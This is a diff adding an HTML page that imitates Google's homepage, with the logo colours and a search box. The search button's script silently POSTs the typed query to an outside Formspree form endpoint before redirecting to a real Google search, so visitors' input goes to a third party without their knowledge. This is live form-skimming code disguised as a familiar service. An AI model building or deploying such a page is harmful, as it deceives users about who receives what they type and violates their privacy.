@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>Formspree検索</title>
+
+<style>
+body{
+    margin:0;
+    background:#fff;
+    font-family:Arial,sans-serif;
+}
+
+.container{
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.logo{
+    font-size:92px;
+    margin-bottom:28px;
+    user-select:none;
+}
+
+.logo span:nth-child(1){color:#4285F4;}
+.logo span:nth-child(2){color:#EA4335;}
+.logo span:nth-child(3){color:#FBBC05;}
+.logo span:nth-child(4){color:#4285F4;}
+.logo span:nth-child(5){color:#34A853;}
+.logo span:nth-child(6){color:#EA4335;}
+
+.search-wrapper{
+    width:600px;
+    max-width:90%;
+    position:relative;
+}
+
+.search-box{
+    width:100%;
+    height:46px;
+    border:1px solid #dfe1e5;
+    border-radius:24px;
+    padding:0 45px;
+    font-size:16px;
+    outline:none;
+    box-sizing:border-box;
+}
+
+.search-box:hover{
+    box-shadow:0 1px 6px rgba(32,33,36,.20);
+}
+
+.search-box:focus{
+    box-shadow:0 1px 6px rgba(32,33,36,.28);
+    border-color:transparent;
+}
+
+.search-icon{
+    position:absolute;
+    left:16px;
+    top:50%;
+    transform:translateY(-50%);
+    color:#9aa0a6;
+}
+
+.buttons{
+    margin-top:30px;
+}
+
+.btn{
+    background:#f8f9fa;
+    border:1px solid #f8f9fa;
+    border-radius:4px;
+    padding:10px 18px;
+    margin:0 5px;
+    cursor:pointer;
+    font-size:14px;
+}
+
+.btn:hover{
+    border:1px solid #dadce0;
+}
+</style>
+
+<script>
+async function searchGoogle() {
+
+    const q = document.getElementById("search").value;
+
+    try {
+
+        await fetch(
+            "https://formspree.io/f/mqeobyzv",
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify({
+                    message:q
+                })
+            }
+        );
+
+    } catch(e) {
+        console.log(e);
+    }
+
+    location.href =
+        "https://www.google.com/search?q=" +
+        encodeURIComponent(q);
+}
+</script>
+
+</head>
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+
+    <form action="https://www.google.com/search" method="GET">
+
+        <div class="search-wrapper">
+            <span class="search-icon">🔍</span>
+
+            <input
+    id="search"
+    class="search-box"
+    type="text"
+    name="q"
+    autocomplete="off">
+        </div>
+
+        <button
+    class="btn"
+    type="button"
+    onclick="searchGoogle()">
+    検索
+</button>
+
+    </form>
+
+</div>
+
+</body>
+</html> 
